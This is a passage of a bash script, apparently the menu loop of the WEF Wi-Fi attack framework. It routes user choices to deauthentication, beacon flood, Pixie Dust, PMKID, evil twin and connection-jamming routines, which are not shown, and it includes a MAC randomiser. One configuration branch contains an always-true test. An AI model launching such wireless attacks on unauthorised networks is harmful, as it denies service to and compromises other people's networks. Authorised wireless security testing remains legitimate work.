  done

  for parameter in ${parameters[@]}; do

    if [ "${parameter}" == "--version" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "\nwef v${program_version} for linux (https://github.com/D3Ext/WEF)"
        echo -e "Created by D3Ext <d3ext@proton.me>\n"
      else
        echo -e "\nwef v${program_version} para linux (https://github.com/D3Ext/WEF)"
        echo -e "Creado por D3Ext <d3ext@proton.me>\n"
      fi
      exit 0
    fi

    if [ "$parameter" == "-h" ] || [ "$parameter" == "--help" ]; then
      help_panel
      exit 0
    fi

    if [ "$parameter" == "-v" ] || [ "$parameter" == "--verbose" ]; then
      verbose=1
    fi
  done

  if [ ! "$verbose" ]; then
    verbose=0
  fi

  if [ ! -d "/opt/wef/main/" ]; then
    echo -e "${yC} __      _____ ___ "
    echo -e " \ \    / / __| __|"
    echo -e "  \ \/\/ /| _|| _| "
    echo -e "   \_/\_/ |___|_|  ${endC}"
    if [ "$lang" == "en" ]; then
      color_output_ln "WEF" "Please run setup.sh before using WEF\n"
    else
      color_output_ln "WEF" "Ejecuta setup.sh antes de usar WEF\n"
    fi
    exit 0
  fi

  if [ "$1" == "--interface" ]; then
    netCard="$2"
  elif [ "$2" == "--interface" ]; then
    netCard="$3"
  elif [ "$3" == "--interface" ]; then
    netCard="$4"
  elif [ "$4" == "--interface" ]; then
    netCard="$5"
  fi

  if [ "$netCard" ]; then
    if [ ! -d "/sys/class/net/${netCard}" ]; then
      echo -e "${yC} __      _____ ___ "
      echo -e " \ \    / / __| __|"
      echo -e "  \ \/\/ /| _|| _| "
      echo -e "   \_/\_/ |___|_|  ${endC}"
      if [ "$lang" == "en" ]; then
        color_output_ln "X" "Interface not found\n"
      else
        color_output_ln "X" "Interfaz no disponible\n"
      fi

      exit 0
    fi

    if [ "$(check_interface_mode)" == "monitor" ]; then
      if [ "$(check_monitor_type)" == "airmon" ]; then
        oldCard=$(echo "${netCard}" | sed 's/mon//g')
        evilCard=${oldCard}
      elif [ "$(check_monitor_type)" == "iwconfig" ]; then
        oldCard=${netCard}
        evilCard=${netCard}
      fi
    fi

    echo
    if [ "$lang" == "en" ]; then
      progress_bar 2 0.9 "*" "Starting framework"
      echo -e "\n${blueC}Use the tool only under your responsibility${endC}"; sleep 0.3
      echo -e "${blueC}${program_version} version${endC}"; sleep 0.3
      echo -e "${blueC}With <3 by D3Ext${endC}"; sleep 1.3
    else
      progress_bar 2 0.9 "*" "Iniciando framework"
      echo -e "\n${blueC}Use la herramienta unicamente bajo su responsabilidad${endC}"; sleep 0.3
      echo -e "${blueC}Versión ${program_version}${endC}"; sleep 0.3
      echo -e "${blueC}Con <3 por D3Ext${endC}"; sleep 1.3
    fi

    # If config has verbose enabled it will be used by default without the --verbose parameter
    verbose_config=$(awk -F "=" '/verbose/ {print $2}' /opt/wef/wef.cnf | awk '{print $1}')
    if [ "$verbose_config" == "true" ]; then
      verbose=1

    elif [ "$verbose_config" == "false" ]; then
      verbose=0

    elif [ "$verbose_config" == "" ]; then
      while true; do
        if [ "$lang" == "en" ]; then
          echo
          color_output_no_line "*" "This is the first time you use the tool, do you want to enable verbose by default? [${yC}y${blueC}/${yC}n${blueC}]: " && read verbose_option
        else
          echo
          color_output_no_line "*" "Esta es la primera vez que usas la herramienta, quieres activar por defecto el verbose? [${yC}s${blueC}/${yC}n${blueC}]: " && read verbose_option
        fi

        if [ "$verbose_option" == "y" ] || [ "$verbose_option" == "yes" ] || [ "$verbose_option" == "s" ] || [ "$verbose_option" == "si" ]; then
          cat /opt/wef/wef.cnf | grep -v "verbose" | sponge /opt/wef/wef.cnf
          echo "verbose=true" >> /opt/wef/wef.cnf
          verbose=1
          break
        elif [ "$verbose_option" == "n" ] || [ "$verbose_option" == "no" ] ; then
          cat /opt/wef/wef.cnf | grep -v "verbose" | sponge /opt/wef/wef.cnf
          echo "verbose=false" >> /opt/wef/wef.cnf
          verbose=0
          break
        fi
      done
    fi

    scan_on_each_attack=$(awk -F "=" '/scan_on_each_attack/ {print $2}' /opt/wef/wef.cnf | awk '{print $1}')
    if [ "$scan_on_each_attack" == "" ]; then
      while true; do
        if [ "$lang" == "en" ]; then
          color_output_no_line "*" "Do you want to scan APs on each attack? Can be changed later in /opt/wef/wef.cnf [${yC}y${blueC}/${yC}n${blueC}]: " && read scan_conf
        else
          color_output_no_line "*" "¿Quieres escanear APs en cada ataque? Se puede cambiar mas tarde en /opt/wef/wef.cnf [${yC}s${blueC}/${yC}n${blueC}]: " && read scan_conf
        fi

        if [ "$scan_conf" == "y" ] || [ "$scan_conf" == "yes" ] || [ "$scan_conf" == "s" ] || [ "$scan_conf" == "si" ]; then
          scan_on_each_attack="true"
          cat /opt/wef/wef.cnf | grep -v "scan_on_each_attack" | sponge /opt/wef/wef.cnf
          echo "scan_on_each_attack=true" >> /opt/wef/wef.cnf
          break
        elif [ "" == "" ] || [ "" == "" ]; then
          scan_on_each_attack="false"
          cat /opt/wef/wef.cnf | grep -v "scan_on_each_attack" | sponge /opt/wef/wef.cnf
          echo "scan_on_each_attack=false" >> /opt/wef/wef.cnf
          break
        else
          if [ "$lang" == "en" ]; then
            color_output "*" "Invalid option!"
          else
            color_output "*" "Opción inválida!"
          fi
        fi
      done
    fi

    clear_p=1 # Define parameter to clear or not the screen
    dependencies
    ifconfig ${netCard} up &>/dev/null

    while true; do
      trap keep_exit_c INT
      input=1

      # Use a counter to not to print the banner and the panel all the times
      if [ $clear_p == 1 ]; then
        clear
        clear_p=0

        banner
        dir=$(pwd)
        print_interface_mode; print_interface_name; print_mac_address

        show_panel
        if [ "$lang" == "en" ]; then
          echo -e "\n${blueC}Type '${yC}help${blueC}' to view more functions and commands${endC}"
        else
          echo -e "\n${blueC}Escribe '${yC}help${blueC}' para ver mas funciones y comandos${endC}"
        fi
      fi

      echo -ne "\n${blueC}[${yC}WEF${blueC}] >>${endC} " && read option
      input=0

      if [ "$option" == "1" ] || [ "$option" == "deauth" ] || [ "$option" == "deauthentication" ] || [ "$option" == "d" ]; then
        sleep 0.15
        if [ "$lang" == "en" ]; then
          type_of_attack="Deauthentication Attack"
        else
          type_of_attack="Ataque de Deautenticacion"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          deauth_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "2" ] || [ "$option" == "wids" ] || [ "$option" == "confusion" ] || [ "$option" == "w" ]; then
        sleep 0.15
        if [ "$lang" == "en" ]; then
          type_of_attack="WIDS Confusion Attack"
        else
          type_of_attack="Ataque de Confusión WIDS"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          wids_confusion; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "3" ] || [ "$option" == "auth" ] || [ "$option" == "authentication" ] || [ "$option" == "a" ]; then
        sleep 0.15
        if [ "$lang" == "en" ]; then
          type_of_attack="Authentication DoS Attack"
        else
          type_of_attack="Ataque de Autenticación DoS"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          auth_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "4" ] || [ "$option" == "beacon" ] || [ "$option" == "beacon flood" ]; then
        sleep 0.15
        if [ "$lang" == "en" ]; then
          type_of_attack="Beacon Flood Attack"
        else
          type_of_attack="Ataque Beacon Flood"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          beacon_flood; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "5" ] || [ "$option" == "michael" ] || [ "$option" == "michael exploitation" ]; then
        sleep 0.15
        if [ "$lang" == "en" ]; then
          type_of_attack="Michael Shutdown Exploitation Attack"
        else
          type_of_attack="Ataque Michael Shutdown Exploitation"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          michael_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "6" ] || [ "$option" == "pixiedust" ] || [ "$option" == "pixie" ]; then
        sleep 0.15
        if [ "$lang" == "en" ]; then
          type_of_attack="Pixie Dust Attack"
        else
          type_of_attack="Ataque Pixie Dust"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          pixie_dust; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "7" ] || [ "$option" == "null" ] || [ "$option" == "nullpin" ] || [ "$option" == "n" ]; then
        sleep 0.15
        if [ "$lang" = "en" ]; then
          type_of_attack="Null Pin Attack"
        else
          type_of_attack="Ataque de Pin nulo"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          null_pin; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "8" ] || [ "$option" == "replay" ]; then
        sleep 0.15
        if [ "$lang" == "en" ]; then
          type_of_attack="Replay Attack"
        else
          type_of_attack="Ataque de Replay"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          replay; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "9" ] || [ "$option" == "chopchop" ] || [ "$option" == "chop chop" ]; then
        sleep 0.15
        if [ "$lang" == "en" ]; then
          type_of_attack="ChopChop Attack"
        else
          type_of_attack="Ataque ChopChop"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          chopchop; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "10" ] || [ "$option" == "caffelatte" ] || [ "$option" == "caffe latte" ]; then
        sleep 0.15
        if [ "$lang" == "en" ]; then
          type_of_attack="Caffe Latte Attack"
        else
          type_of_attack="Ataque Caffe Latte"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          caffe_latte; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "11" ] || [ "$option" == "passive" ] || [ "$option" == "wpa" ] || [ "$option" == "handshake" ]; then
        sleep 0.15
        if [ "$lang" == "en" ]; then
          type_of_attack="WPA handshake capture attack"
        else
          type_of_attack="Ataque de captura de handshake WPA"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          passive_capture_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "12" ] || [ "$option" == "pmkid" ]; then
        sleep 0.15
        if [ "$lang" == "en" ]; then
          type_of_attack="PMKID Attack"
        else
          type_of_attack="Ataque PMKID"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          pmkid_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "13" ] || [ "$option" == "evil" ] || [ "$option" == "eviltwin" ] || [ "$option" == "e" ]; then
        sleep 0.15
        if [ "$(check_interface_mode)" == "monitor" ]; then
          evilTwin; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "enable" ] || [ "$option" == "start" ] || [ "$option" == "monitor" ]; then
        if [ "$(check_interface_mode)" == "monitor" ]; then
          if [ "$lang" == "en" ]; then
            echo -e "\n${yC}Interface already in monitor mode${endC}"
          else
            echo -e "\n${yC}La interfaz ya está en modo monitor${endC}"
          fi

        else
          enable_mon; clear_p=1
        fi

      elif [ "$option" == "disable" ] || [ "$option" == "stop" ]; then
        #if [[ $start_counter == 1 ]]; then
        if [ "$(check_interface_mode)" == "monitor" ]; then
          disable_mon;
          if [ "$lang" == "en" ]; then
            press_enter "Monitor mode disabled, press Enter to continue "
          else
            press_enter "Modo monitor desactivado, presiona Enter para continuar "
          fi
          clear_p=1

        else
          if [ "$lang" == "en" ]; then
            echo -e "\n${yC}Interface already in managed mode${endC}"
          else
            echo -e "\n${yC}La interfaz ya está en modo managed${endC}"
          fi
        fi

      elif [ "$option" == "mac" ] || [ "$option" == "random" ] || [ "$option" == "randomize" ]; then
        if [ "$(check_interface_mode)" == "monitor" ]; then
          mac_randomizer
          changed_mac=$(macchanger -s ${netCard} | grep "Curren" | awk '{print $3}') # Get new MAC address
          vendor=$(macchanger -s ${netCard} | grep "Curren" | awk '{print $2}' FS="(") # Get vendor from "macchanger" output
          if [ "$lang" == "en" ]; then
            echo -e "${blueC}[${yC}*${blueC}] New MAC: ${greenC}${changed_mac} ${blueC}(${vendor}${endC}"
          else
            echo -e "${blueC}[${yC}*${blueC}] Nueva dirección MAC: ${greenC}${changed_mac} ${blueC}(${vendor}${endC}"
          fi
        else
          log_monitor_is_disabled
        fi

      elif [ "$(echo $option | awk '{print $1}')" == "check" ]; then
        cap_name=$(echo $option | sed 's/check //')
        if [ -f "${cap_name}" ]; then
          #if [ "$(check_handshakes_in_file)" -gt "0" ]; then
          if [ "$lang" == "en" ]; then
            good_output_ln "+" "File contains $(check_handshakes_in_file) WPA handshakes"
          else
            good_output_ln "+" "El archivo contiene $(check_handshakes_in_file) handshakes WPA"
          fi
        else
          if [ "$lang" == "en" ]; then
            color_output_ln "X" "Especified file doesn't exist!"
          else
            color_output_ln "X" "El archivo especificado no existe!"
          fi
        fi

      elif [ "$option" == "exit" ] || [ "$option" == "quit" ] || [ "$option" == "salir" ]; then
        ctrl_c

      elif [ "$option" == "help" ] || [ "$option" == "?" ] || [ "$option" == "Help" ]; then
        list_help

      elif [ "$option" == "clear" ] || [ "$option" == "cls" ]; then
        clear

      elif [ "$option" == "panel" ]; then
        show_panel

      elif [ "$option" == "scan" ] || [ "$option" == "scanner" ]; then
        if [ "$(check_interface_mode)" == "monitor" ]; then
          ap_scan
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "attacks" ]; then
        log_functions_info

      elif [ "$option" == "list" ]; then
        list_aps

      elif [ "$option" == "chipsets" ] || [ "$option" == "chipset" ]; then
        chipsets_panel

      elif [ "$option" == "info" ] || [ "$option" == "status" ]; then
        print_interface_mode
        print_interface_name
        print_mac_address
        print_chipset
        print_freq_band

      elif [ "$option" == "crack" ]; then
        # TODO
        echo

      elif [ "$option" == "update" ]; then
        echo
        progress_bar 2 0.3 "*" "Checking the latest version"
        sleep 0.2
        if [ "$(curl -s -X GET 'https://raw.githubusercontent.com/D3Ext/WEF/main/src/version.txt')" != "${program_version}" ]; then
          echo -ne "\n${blueC}[${greenC}+${blueC}] New version found. Do you want to update WEF? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read update_option
          if [ "${update_option}" == "y" ] || [ "${update_option}" == "yes" ]; then
            bash /opt/wef/update.sh &>/dev/null
            good_output_ln "+" "Update completed successfully"
          fi
        else
          if [ "$lang" == "en" ]; then
            good_output_ln "+" "This is the latest version"
          else
            good_output_ln "+" "Esta es la ultima versión"
          fi
        fi

      elif [ "$(echo ${option} | awk '{print $1}')" == "inhibit" ]; then

        if [ ! "$(echo ${option} | sed "s/^[^ ]* //")" ]; then # Check is user has provided an AP name
          if [ "$lang" == "en" ]; then
            color_output_ln "*" "Please especify a valid AP name to inhibit its connections"
          else
            color_output_ln "*" "Proporciona un nombre de AP válido para inhibir sus conexiones"
          fi
        elif [ "$(check_interface_mode)" == "monitor" ]; then
          ap_to_inhibit=$(echo ${option} | sed "s/^[^ ]* //")
          name="${ap_to_inhibit}"
          echo
          inhibitor
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "verbose" ] || [ "$option" == "v" ]; then
        verbose=1
        if [ "$lang" == "en" ]; then
          echo -e "\n${blueC}Output verbose ON${endC}"
        else
          echo -e "\n${blueC}Verbose activado${endC}"
        fi

      elif [ "$option" == "noverbose" ] || [ "$option" == "no-verbose" ] || [ "$option" == "no verbose" ]; then
        verbose=0
        if [ "$lang" == "en" ]; then
          echo -e "\n${blueC}Output verbose OFF${endC}"
        else
          echo -e "\n${blueC}Verbose desactivado${endC}"
        fi

      elif [ "$option" == "version" ]; then
        if [ "$lang" == "en" ]; then
          echo -e "\nwef v${program_version} for linux (https://github.com/D3Ext/WEF)"
          echo -e "Created by D3Ext <d3ext@proton.me>"
        else
          echo -e "\nwef v${program_version} para linux (https://github.com/D3Ext/WEF)"
          echo -e "Creado por D3Ext <d3ext@proton.me>"
        fi

      else # Finally enter in this case if the command is invalid
        if [ "$lang" == "en" ]; then
          color_output_ln "X" "Unknown option, type 'help'"
        else
          color_output_ln "X" "Opción inválida, escribe 'help'"
        fi
      fi
    
    done

  else
    help_panel
  fi

else
  echo -e "${yC} __      _____ ___ "
  echo -e " \ \    / / __| __|"
  echo -e "  \ \/\/ /| _|| _| "
  echo -e "   \_/\_/ |___|_|  ${endC}"

  if [ "$lang" == "en" ]; then
    color_output_ln "X" "Execute the program as root\n"
  else
    color_output_ln "X" "Ejecuta el programa como root\n"
  fi
  
  exit 1
fi


